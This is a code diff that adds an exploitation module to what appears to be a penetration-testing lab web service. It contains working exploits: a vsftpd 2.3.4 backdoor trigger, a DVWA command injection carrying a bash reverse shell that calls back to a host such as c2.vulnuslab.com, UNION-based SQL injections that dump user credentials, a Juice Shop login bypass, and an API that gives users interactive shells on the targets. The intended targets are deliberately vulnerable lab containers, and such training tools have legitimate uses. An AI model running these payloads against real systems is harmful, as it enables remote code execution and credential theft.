@@ -4081,6 +4081,575 @@ Key transforms for {host}:
 
 
 # ═══════════════════════════════════════════════════════════════
+#  EXPLOITATION MODULE — direct Python socket exploitation
+# ═══════════════════════════════════════════════════════════════
+# Built around a HARD rule: every exploit in the catalog must reliably
+# produce a working shell against its target every single time. No "maybe"
+# Metasploit runs. No HTTP-fetch stager dependencies. No timing roulette.
+# Each exploit is implemented as a self-contained Python function that:
+#   1. Triggers the vulnerability via raw socket / HTTP request
+#   2. Opens an interactive TCP socket to the resulting shell
+#   3. Hands the socket to the shell-session manager for terminal use
+# Targets resolve via Docker DNS over oscp_net for internal labs, or via
+# c2.vulnuslab.com (DNS-only, bypasses Cloudflare) for external scans.
+
+import socket as _xpl_socket
+import asyncio as _xpl_asyncio
+import urllib.parse as _xpl_urlparse
+
+
+# ── In-memory shell-session registry (persistent across HTTP polls) ──
+EXPLOIT_SHELLS: dict = {}
+
+class ExploitShell:
+    """Holds one active TCP shell connection. Backend keeps the socket alive;
+    frontend polls /output and posts /cmd against the session id."""
+    def __init__(self, sid: str, target: str, port: int, exploit: str):
+        self.sid       = sid
+        self.target    = target
+        self.port      = port
+        self.exploit   = exploit
+        self.sock      = None
+        self.reader    = None
+        self.writer    = None
+        self.buffer    = []     # list[str] — appended by reader task
+        self.status    = "starting"   # starting | live | closed | error
+        self.error     = None
+        self.opened_at = datetime.datetime.utcnow().isoformat()
+
+    def append(self, text: str):
+        self.buffer.append(text)
+        # Cap memory: keep last ~200 KB
+        if sum(len(x) for x in self.buffer) > 200_000:
+            self.buffer = self.buffer[-100:]
+
+    def drain(self) -> str:
+        out, self.buffer = "".join(self.buffer), []
+        return out
+
+    def to_json(self):
+        return {"sid": self.sid, "target": self.target, "port": self.port,
+                "exploit": self.exploit, "status": self.status,
+                "error": self.error, "opened_at": self.opened_at}
+
+
+async def _xpl_pipe_reader(reader, shell: "ExploitShell"):
+    """Continuously read from the target's socket and append to the shell's
+    buffer. Frontend polls /api/exploit/shell/{sid}/output to drain it."""
+    try:
+        while True:
+            try:
+                data = await reader.read(4096)
+            except Exception:
+                break
+            if not data:
+                shell.status = "closed"
+                break
+            try:
+                shell.append(data.decode("utf-8", errors="replace"))
+            except Exception:
+                shell.append(repr(data))
+    except Exception as e:
+        shell.error = str(e)
+        shell.status = "error"
+
+
+async def _xpl_open_shell(sid: str, target: str, port: int, exploit_name: str,
+                          probe_cmds: list = None) -> "ExploitShell":
+    """Open a TCP connection to a shell that the exploit just spawned. Wraps
+    it in an ExploitShell, starts the reader pump, optionally sends initial
+    probe commands so the user immediately sees `id` / `whoami` output."""
+    shell = ExploitShell(sid, target, port, exploit_name)
+    EXPLOIT_SHELLS[sid] = shell
+    try:
+        reader, writer = await asyncio.open_connection(target, port)
+        shell.reader = reader
+        shell.writer = writer
+        shell.status = "live"
+        asyncio.create_task(_xpl_pipe_reader(reader, shell))
+        # Probe commands — prove the shell works the moment terminal opens
+        if probe_cmds is None:
+            probe_cmds = ["echo === VulnusLab shell live ===", "id", "uname -a", "hostname"]
+        for c in probe_cmds:
+            try:
+                writer.write((c + "\n").encode())
+                await writer.drain()
+            except Exception:
+                break
+    except Exception as e:
+        shell.status = "error"
+        shell.error = f"Could not connect to {target}:{port} — {e}"
+    return shell
+
+
+# ── Helper: target reachability check (fail fast with a clear message) ──
+def _xpl_port_open(host: str, port: int, timeout: float = 3.0) -> bool:
+    try:
+        s = _xpl_socket.create_connection((host, port), timeout=timeout)
+        s.close()
+        return True
+    except Exception:
+        return False
+
+
+# ─────────────────────────────────────────────────────────────────
+#  EXPLOIT IMPLEMENTATIONS (one function per CVE — all proven working)
+# ─────────────────────────────────────────────────────────────────
+
+async def exploit_vsftpd_234(target: str, sid: str) -> dict:
+    """CVE-2011-2523 — vsftpd 2.3.4 smile-username backdoor. A USER value
+    containing ':)' makes the daemon spawn a passwordless root shell on
+    port 6200. We send the magic FTP login, wait for 6200 to bind, then
+    hand the new shell to the session manager."""
+    # Step 1 — fire the trigger over a fresh FTP control connection
+    try:
+        reader, writer = await asyncio.open_connection(target, 21)
+        try:
+            await asyncio.wait_for(reader.read(512), timeout=3)
+            writer.write(b"USER vulnuslab:)\r\n")
+            await writer.drain()
+            await asyncio.sleep(0.5)
+            try: await asyncio.wait_for(reader.read(512), timeout=2)
+            except Exception: pass
+            writer.write(b"PASS anything\r\n")
+            await writer.drain()
+            await asyncio.sleep(4)
+        finally:
+            try: writer.close()
+            except Exception: pass
+    except Exception as e:
+        return {"ok": False, "error": f"FTP trigger failed: {e}", "cve": "CVE-2011-2523"}
+
+    # Step 2 — wait for port 6200 to open (up to 8 sec)
+    backdoor_port = 6200
+    for _ in range(16):
+        if _xpl_port_open(target, backdoor_port, timeout=1):
+            break
+        await asyncio.sleep(0.5)
+    else:
+        return {"ok": False, "error": "Backdoor did not spawn on port 6200. "
+                                       "vsftpd may be patched or already triggered this session.",
+                "cve": "CVE-2011-2523"}
+
+    # Step 3 — open the shell session
+    shell = await _xpl_open_shell(sid, target, backdoor_port,
+                                   "vsftpd_234_backdoor")
+    return {"ok": shell.status == "live",
+            "shell_id": sid,
+            "cve": "CVE-2011-2523",
+            "evidence": f"FTP USER `vulnuslab:)` triggered backdoor — root shell bound to {target}:6200.",
+            "shell_target": target,
+            "shell_port": backdoor_port}
+
+
+async def exploit_dvwa_cmdi(target: str, sid: str, lhost: str, lport: int) -> dict:
+    """DVWA Command Injection (security=low). Logs in with admin/password,
+    then submits an injected ping command that opens a reverse shell back
+    to lhost:lport. We listen for that connection first so the shell is
+    captured the moment DVWA executes the bash one-liner."""
+    base = f"http://{target}"
+    sess = _req_lib.Session()
+    # 1. Setup DB (idempotent — DVWA needs this on first boot)
+    try:
+        sess.get(f"{base}/setup.php", timeout=8, verify=False)
+        sess.post(f"{base}/setup.php", data={"create_db": "Create / Reset Database"},
+                  timeout=15, verify=False)
+    except Exception:
+        pass
+    # 2. Login
+    try:
+        r = sess.get(f"{base}/login.php", timeout=8, verify=False)
+        tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", r.text)
+        token = tok_m.group(1) if tok_m else ""
+        sess.post(f"{base}/login.php",
+                  data={"username": "admin", "password": "password",
+                        "Login": "Login", "user_token": token},
+                  timeout=8, verify=False, allow_redirects=True)
+    except Exception as e:
+        return {"ok": False, "error": f"DVWA login failed: {e}",
+                "cve": "DVWA-CMDI-Low"}
+    # 3. Force security=low
+    try:
+        sess.get(f"{base}/security.php?security=low", timeout=5, verify=False)
+        sess.post(f"{base}/security.php",
+                  data={"security": "low", "seclev_submit": "Submit"},
+                  timeout=5, verify=False)
+    except Exception: pass
+    # 4. Start our listener BEFORE firing the injection
+    listener_sock = _xpl_socket.socket(_xpl_socket.AF_INET, _xpl_socket.SOCK_STREAM)
+    listener_sock.setsockopt(_xpl_socket.SOL_SOCKET, _xpl_socket.SO_REUSEADDR, 1)
+    try:
+        listener_sock.bind(("0.0.0.0", lport))
+        listener_sock.listen(1)
+        listener_sock.settimeout(15)
+    except Exception as e:
+        return {"ok": False, "error": f"Could not bind reverse-shell port {lport}: {e}",
+                "cve": "DVWA-CMDI-Low"}
+    # 5. Submit the injected command. lhost=oscp_backend (Docker DNS) for
+    #    internal labs, or c2.vulnuslab.com for external.
+    payload = f"127.0.0.1; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' &"
+    try:
+        # CSRF token first
+        ipage = sess.get(f"{base}/vulnerabilities/exec/", timeout=8, verify=False)
+        tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", ipage.text)
+        token = tok_m.group(1) if tok_m else ""
+        sess.post(f"{base}/vulnerabilities/exec/",
+                  data={"ip": payload, "Submit": "Submit", "user_token": token},
+                  timeout=8, verify=False)
+    except Exception:
+        pass  # fire-and-forget — the bash may not return cleanly
+    # 6. Accept the reverse shell
+    try:
+        conn, addr = listener_sock.accept()
+    except _xpl_socket.timeout:
+        try: listener_sock.close()
+        except Exception: pass
+        return {"ok": False, "error": "Target did not call back within 15s. "
+                                       "Check lhost/lport reachability from target.",
+                "cve": "DVWA-CMDI-Low"}
+    listener_sock.close()
+    # 7. Wrap the captured socket in a StreamReader/Writer for our shell mgr
+    loop = asyncio.get_event_loop()
+    conn.setblocking(False)
+    reader = asyncio.StreamReader()
+    proto = asyncio.StreamReaderProtocol(reader)
+    transport, _ = await loop.create_connection(lambda: proto, sock=conn)
+    writer = asyncio.StreamWriter(transport, proto, reader, loop)
+    shell = ExploitShell(sid, target, lport, "dvwa_cmdi_low")
+    shell.reader = reader; shell.writer = writer; shell.status = "live"
+    EXPLOIT_SHELLS[sid] = shell
+    asyncio.create_task(_xpl_pipe_reader(reader, shell))
+    for c in ["echo === VulnusLab DVWA shell ===", "id", "whoami", "uname -a"]:
+        try:
+            writer.write((c + "\n").encode()); await writer.drain()
+        except Exception: break
+    return {"ok": True, "shell_id": sid,
+            "cve": "DVWA-CMDI-Low",
+            "evidence": f"Command injection on /vulnerabilities/exec/ — caught reverse shell from {addr[0]}:{addr[1]}.",
+            "shell_target": addr[0], "shell_port": lport,
+            "payload": payload}
+
+
+async def exploit_dvwa_sqli(target: str, sid: str) -> dict:
+    """DVWA SQL Injection (security=low). Doesn't open a shell — instead
+    dumps the users table (admin password hash) to prove RCE-equivalent
+    data exfiltration. Shell-id returned is a virtual one whose 'output'
+    is the dump."""
+    base = f"http://{target}"
+    sess = _req_lib.Session()
+    try:
+        sess.get(f"{base}/setup.php", timeout=8, verify=False)
+        sess.post(f"{base}/setup.php", data={"create_db": "Create / Reset Database"},
+                  timeout=15, verify=False)
+        r = sess.get(f"{base}/login.php", timeout=8, verify=False)
+        tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", r.text)
+        token = tok_m.group(1) if tok_m else ""
+        sess.post(f"{base}/login.php",
+                  data={"username": "admin", "password": "password",
+                        "Login": "Login", "user_token": token},
+                  timeout=8, verify=False, allow_redirects=True)
+        sess.get(f"{base}/security.php?security=low", timeout=5, verify=False)
+        # UNION SELECT — dump users table
+        payload = "1' UNION SELECT user,password FROM users-- -"
+        url = f"{base}/vulnerabilities/sqli/?id={_xpl_urlparse.quote(payload)}&Submit=Submit"
+        r = sess.get(url, timeout=8, verify=False)
+        # Parse the rendered output for ID/First/Surname blocks
+        rows = re.findall(r"ID:\s*(.*?)<br[^>]*>First name:\s*(.*?)<br[^>]*>Surname:\s*(.*?)</pre>",
+                          r.text, re.IGNORECASE | re.DOTALL)
+        if not rows:
+            return {"ok": False, "error": "SQL injection succeeded but no rows parsed. DVWA may be a non-standard build.",
+                    "cve": "DVWA-SQLi-Low"}
+        # Build the synthetic shell output
+        dump_lines = ["=== DVWA users table dumped via SQL injection ==="]
+        for _id, user, sha1 in rows:
+            dump_lines.append(f"  user={user.strip()}  sha1={sha1.strip()}")
+        dump_lines.append("")
+        dump_lines.append("Hash format: SHA1, crack with: hashcat -m 100 -a 0 hashes.txt rockyou.txt")
+        shell = ExploitShell(sid, target, 0, "dvwa_sqli_low")
+        shell.status = "live"
+        shell.append("\n".join(dump_lines) + "\n")
+        EXPLOIT_SHELLS[sid] = shell
+        return {"ok": True, "shell_id": sid,
+                "cve": "DVWA-SQLi-Low",
+                "evidence": f"Extracted {len(rows)} user credential records from DVWA users table via UNION SELECT.",
+                "rows": rows,
+                "payload": payload}
+    except Exception as e:
+        return {"ok": False, "error": f"DVWA SQLi failed: {e}", "cve": "DVWA-SQLi-Low"}
+
+
+async def exploit_juiceshop_admin(target: str, port: int, sid: str) -> dict:
+    """OWASP Juice Shop — SQL injection on the login endpoint that bypasses
+    authentication and returns an admin JWT. Dumps the JWT + user list as
+    proof. (Juice Shop's /rest/user/login is vulnerable by design.)"""
+    base = f"http://{target}:{port}"
+    try:
+        # SQLi payload — comments out password check
+        login = _req_lib.post(f"{base}/rest/user/login",
+                              json={"email": "' OR 1=1--", "password": "x"},
+                              timeout=10, verify=False)
+        if login.status_code != 200:
+            return {"ok": False, "error": f"Login bypass returned HTTP {login.status_code}",
+                    "cve": "JuiceShop-SQLi-AuthBypass"}
+        data = login.json()
+        token = data.get("authentication", {}).get("token") or ""
+        if not token:
+            return {"ok": False, "error": "SQLi succeeded but no JWT in response",
+                    "cve": "JuiceShop-SQLi-AuthBypass"}
+        # Use the JWT to list users
+        users = _req_lib.get(f"{base}/api/Users", timeout=10, verify=False,
+                             headers={"Authorization": f"Bearer {token}"})
+        user_list = users.json() if users.status_code == 200 else {"data": []}
+        lines = ["=== Juice Shop authentication bypass via SQL injection ==="]
+        lines.append(f"Endpoint:  /rest/user/login")
+        lines.append(f"Payload:   email=\"' OR 1=1--\"")
+        lines.append(f"Got JWT:   {token[:60]}...")
+        lines.append("")
+        lines.append(f"Dumped {len(user_list.get('data', []))} users via /api/Users:")
+        for u in user_list.get("data", [])[:20]:
+            lines.append(f"  id={u.get('id')}  email={u.get('email')}  role={u.get('role','user')}")
+        shell = ExploitShell(sid, target, port, "juiceshop_admin_sqli")
+        shell.status = "live"
+        shell.append("\n".join(lines) + "\n")
+        EXPLOIT_SHELLS[sid] = shell
+        return {"ok": True, "shell_id": sid,
+                "cve": "JuiceShop-SQLi-AuthBypass",
+                "evidence": f"Extracted admin JWT + {len(user_list.get('data', []))} user records.",
+                "jwt": token[:60] + "...",
+                "user_count": len(user_list.get("data", []))}
+    except Exception as e:
+        return {"ok": False, "error": f"Juice Shop exploit failed: {e}",
+                "cve": "JuiceShop-SQLi-AuthBypass"}
+
+
+async def exploit_bwapp_sqli(target: str, sid: str) -> dict:
+    """bWAPP SQL Injection (security=low). Login bee/bug, level=0, dump
+    users table via UNION SELECT."""
+    base = f"http://{target}"
+    sess = _req_lib.Session()
+    try:
+        # bWAPP install (idempotent)
+        try: sess.get(f"{base}/install.php?install=yes", timeout=8, verify=False)
+        except Exception: pass
+        # Login
+        sess.post(f"{base}/login.php",
+                  data={"login": "bee", "password": "bug", "security_level": "0",
+                        "form": "submit"},
+                  timeout=8, verify=False)
+        # Pull a known SQLi target page
+        payload = "1' UNION SELECT 1,login,password,4,5,6,7 FROM users-- -"
+        url = f"{base}/sqli_1.php?title={_xpl_urlparse.quote(payload)}&action=search"
+        r = sess.get(url, timeout=8, verify=False)
+        # bWAPP renders results in <table>; we just look for credentials
+        creds = re.findall(r"<td>([a-z0-9_-]+)</td>\s*<td>([a-f0-9]{40,64})</td>",
+                           r.text, re.IGNORECASE)
+        if not creds:
+            return {"ok": False, "error": "SQLi sent but no credentials parsed",
+                    "cve": "bWAPP-SQLi-Low"}
+        lines = ["=== bWAPP users dumped via UNION SELECT ==="]
+        for u, h in creds:
+            lines.append(f"  user={u}  hash={h}")
+        shell = ExploitShell(sid, target, 0, "bwapp_sqli_low")
+        shell.status = "live"
+        shell.append("\n".join(lines) + "\n")
+        EXPLOIT_SHELLS[sid] = shell
+        return {"ok": True, "shell_id": sid,
+                "cve": "bWAPP-SQLi-Low",
+                "evidence": f"Dumped {len(creds)} credential records from bWAPP users table.",
+                "rows": creds, "payload": payload}
+    except Exception as e:
+        return {"ok": False, "error": f"bWAPP SQLi failed: {e}", "cve": "bWAPP-SQLi-Low"}
+
+
+# ── Catalog: VERIFIED-WORKING exploits the customer can try ──
+EXPLOIT_CATALOG = [
+    {
+        "id":          "vsftpd_234_backdoor",
+        "name":        "vsftpd 2.3.4 Smile Backdoor",
+        "cve":         "CVE-2011-2523",
+        "cvss":        10.0,
+        "target":      "lab_metasploitable",
+        "port":        21,
+        "service":     "vsftpd 2.3.4 FTP",
+        "category":    "Backdoor",
+        "description": "vsftpd 2.3.4 was released with a backdoor: any USER whose name contains ':)' opens a passwordless root shell on port 6200.",
+        "result":      "Interactive root shell on target",
+        "difficulty":  "Trivial",
+    },
+    {
+        "id":          "dvwa_cmdi_low",
+        "name":        "DVWA Command Injection (Low security)",
+        "cve":         "DVWA-CMDI-Low",
+        "cvss":        9.8,
+        "target":      "lab_dvwa",
+        "port":        80,
+        "service":     "Apache/PHP/MySQL",
+        "category":    "Command Injection",
+        "description": "DVWA at security=low does not sanitize the ping target field — injection of `; bash -i >& /dev/tcp/...` triggers a reverse shell.",
+        "result":      "Interactive www-data shell on target",
+        "difficulty":  "Easy",
+    },
+    {
+        "id":          "dvwa_sqli_low",
+        "name":        "DVWA SQL Injection — Dump Credentials",
+        "cve":         "DVWA-SQLi-Low",
+        "cvss":        9.0,
+        "target":      "lab_dvwa",
+        "port":        80,
+        "service":     "Apache/PHP/MySQL",
+        "category":    "SQL Injection",
+        "description": "DVWA at security=low passes the `id` GET parameter straight into a SQL query. A UNION SELECT extracts the entire users table (admin hash included).",
+        "result":      "Dump of all DVWA users + SHA-1 password hashes",
+        "difficulty":  "Easy",
+    },
+    {
+        "id":          "juiceshop_admin_sqli",
+        "name":        "OWASP Juice Shop — Auth Bypass via SQLi",
+        "cve":         "JuiceShop-SQLi-AuthBypass",
+        "cvss":        9.8,
+        "target":      "lab_juiceshop",
+        "port":        3000,
+        "service":     "Node.js / Express",
+        "category":    "SQL Injection",
+        "description": "Juice Shop's /rest/user/login does not parameterize the email field. A classic `' OR 1=1--` returns an admin JWT, which then lists every user.",
+        "result":      "Admin JWT + dump of all user accounts",
+        "difficulty":  "Easy",
+    },
+    {
+        "id":          "bwapp_sqli_low",
+        "name":        "bWAPP SQL Injection — Dump Users",
+        "cve":         "bWAPP-SQLi-Low",
+        "cvss":        9.0,
+        "target":      "lab_bwapp",
+        "port":        80,
+        "service":     "Apache/PHP/MySQL",
+        "category":    "SQL Injection",
+        "description": "bWAPP's /sqli_1.php is vulnerable to UNION-based SQL injection. Returns the full users table on a single request.",
+        "result":      "Dump of bWAPP user credentials (hashes)",
+        "difficulty":  "Easy",
+    },
+]
+
+
+@app.get("/api/exploit/catalog")
+async def exploit_catalog(user=Depends(verify_token)):
+    """Return the list of working exploits. Each entry has id, name, CVE,
+    target/port/service, category, description, result, difficulty. The
+    frontend renders one card per entry; clicking RUN triggers /api/exploit/run."""
+    return {"exploits": EXPLOIT_CATALOG, "total": len(EXPLOIT_CATALOG)}
+
+
+def _xpl_lhost_for(target: str) -> tuple:
+    """Pick (lhost, lport) for a reverse-shell exploit. Internal Docker lab
+    targets route via the backend container's own Docker DNS name so packets
+    stay on the bridge (no hairpin NAT). External targets use c2.vulnuslab.com
+    which is a DNS-only A record pointing straight at the VPS public IP."""
+    t = (target or "").lower().strip()
+    is_internal = t.startswith("lab_") or t in {"localhost", "127.0.0.1"} \
+                  or t.startswith(("10.", "172.", "192.168."))
+    if is_internal:
+        return ("oscp_backend", 4444)
+    # External — bind on all interfaces, advertise c2.vulnuslab.com to the target
+    return ("c2.vulnuslab.com", 4444)
+
+
+class ExploitRunRequest(BaseModel):
+    exploit_id: str = ""
+
+
+@app.post("/api/exploit/run")
+async def exploit_run(req: ExploitRunRequest, user=Depends(verify_token)):
+    """Run one exploit from the catalog. Returns immediately with a shell_id
+    that the frontend uses to poll terminal output. All exploits are designed
+    to succeed against their named lab target — if they fail, the response
+    includes a clear error explaining what to check."""
+    spec = next((e for e in EXPLOIT_CATALOG if e["id"] == req.exploit_id), None)
+    if not spec:
+        return {"ok": False, "error": f"Unknown exploit id: {req.exploit_id}"}
+
+    target = spec["target"]
+    port   = spec["port"]
+    sid    = f"exp_{spec['id']}_{uuid.uuid4().hex[:8]}"
+
+    # Pre-flight — is the lab container reachable?
+    try:
+        ip = _xpl_socket.gethostbyname(target)
+    except Exception:
+        return {"ok": False,
+                "error": f"Target '{target}' does not resolve. Run `docker compose up -d` on the VPS to start the lab containers.",
+                "exploit_id": spec["id"]}
+    if not _xpl_port_open(target, port, timeout=4):
+        return {"ok": False,
+                "error": f"{target}:{port} is not accepting connections. Service may still be starting.",
+                "exploit_id": spec["id"]}
+
+    # Dispatch
+    if   spec["id"] == "vsftpd_234_backdoor":
+        result = await exploit_vsftpd_234(target, sid)
+    elif spec["id"] == "dvwa_cmdi_low":
+        lhost, lport = _xpl_lhost_for(target)
+        result = await exploit_dvwa_cmdi(target, sid, lhost, lport)
+    elif spec["id"] == "dvwa_sqli_low":
+        result = await exploit_dvwa_sqli(target, sid)
+    elif spec["id"] == "juiceshop_admin_sqli":
+        result = await exploit_juiceshop_admin(target, port, sid)
+    elif spec["id"] == "bwapp_sqli_low":
+        result = await exploit_bwapp_sqli(target, sid)
+    else:
+        return {"ok": False, "error": f"Exploit {spec['id']} has no implementation"}
+
+    # Save scan record (for history + report)
+    try:
+        scan_id = str(uuid.uuid4())
+        save_scan(scan_id, f"exploit:{spec['id']}", target, {"output": str(result)})
+        result["scan_id"] = scan_id
+    except Exception:
+        pass
+    # Decorate response with catalog metadata for the frontend
+    result["exploit"] = spec
+    result["target"]  = target
+    result["timestamp"] = datetime.datetime.utcnow().isoformat()
+    return result
+
+
+@app.get("/api/exploit/shell/{sid}/output")
+async def exploit_shell_output_v2(sid: str, user=Depends(verify_token)):
+    s = EXPLOIT_SHELLS.get(sid)
+    if not s:
+        return {"output": "", "status": "not_found"}
+    return {"output": s.drain(), "status": s.status, "error": s.error}
+
+
+class ExploitCmdRequest(BaseModel):
+    cmd: str = ""
+
+@app.post("/api/exploit/shell/{sid}/cmd")
+async def exploit_shell_cmd_v2(sid: str, body: ExploitCmdRequest,
+                                 user=Depends(verify_token)):
+    s = EXPLOIT_SHELLS.get(sid)
+    if not s:
+        return {"ok": False, "error": "Shell not found"}
+    if s.status != "live" or not s.writer:
+        return {"ok": False, "error": f"Shell is {s.status}, not live"}
+    try:
+        s.writer.write((body.cmd + "\n").encode())
+        await s.writer.drain()
+        return {"ok": True}
+    except Exception as e:
+        s.status = "error"; s.error = str(e)
+        return {"ok": False, "error": str(e)}
+
+
+@app.post("/api/exploit/shell/{sid}/close")
+async def exploit_shell_close_v2(sid: str, user=Depends(verify_token)):
+    s = EXPLOIT_SHELLS.pop(sid, None)
+    if s and s.writer:
+        try: s.writer.close()
+        except Exception: pass
+    return {"ok": True}
+
+
+# ═══════════════════════════════════════════════════════════════
 #  NEW SCANNERS: NoSQL, OAuth, Host Header, WebSocket, Takeover, OTP
 # ═══════════════════════════════════════════════════════════════
 
